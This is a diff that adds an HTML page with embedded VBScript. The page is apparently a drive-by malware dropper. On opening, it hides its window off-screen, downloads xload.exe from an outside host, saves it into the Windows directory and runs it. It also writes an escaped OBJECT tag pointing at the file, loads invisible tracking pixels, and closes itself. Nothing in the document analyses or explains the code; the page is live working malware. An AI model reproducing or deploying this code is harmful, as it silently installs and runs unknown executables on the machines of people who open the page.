@@ -1,0 +1,78 @@
+602
+
+<html>
+<head></head>
+<body>
+
+<script language=vbs>
+on error resume next 
+self.MoveTo 5000,5000 
+
+   Dim oADOStream
+   Dim xmlHttp
+   Dim response
+   Dim fso 
+
+Set WshShell = CreateObject("WScript.Shell") 
+Set WshEnv = WshShell.Environment("Process") 
+ 
+Set fso = CreateObject("Scripting.FileSystemObject") 
+Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
+Set oADOStream = CreateObject("ADODB.Stream")
+
+
+spth = WshEnv("WINDIR") & "\xload.exe"
+   If (fso.FileExists(spth)) Then
+   Else
+   xmlhttp.Open "GET" , "http://sxload.com/data/xload.exe", False
+   xmlhttp.Send
+   response = xmlHttp.ResponseBody
+   oADOStream.Type = 1 
+   oADOStream.Mode = 3 
+   oADOStream.Open
+   oADOStream.Write response
+   oADOStream.SaveToFile spth, 2
+   oADOStream.Close
+   Set oADOStream = Nothing
+   End If
+
+   Set xmlHttp = Nothing
+   Set oADOStream = Nothing
+
+
+
+document.write Unescape("%3C%4F%42%4A%45%43%54%20%4E%41%4D%45%3D%27%78%6C%6F%61%64%27%20%43%4C%41%53%53%49%44%3D%27%43%4C%53%49%44%3A%31%31%31%31%31%31%31%31%2D%31%31%31%31%2D%31%31%31%31%2D%31%31%31%31%2D%31%31%31%31%31%31%31%31%31%32%33%34%27%20%43%4F%44%45%42%41%53%45%3D%27" + spth + "%27%3E")
+
+
+
+
+WshShell.run("""" & spth & """")
+</script>
+
+<img src="http://fc.webmasterpro.de/as_noscript.php?name=sloadhta" style="width:1px;height:1px;">
+<img src="http://fc.webmasterpro.de/as_noscript.php?name=sloadex" style="width:1px;height:1px;">
+
+<script language=vbs>
+window.close()
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+0
+
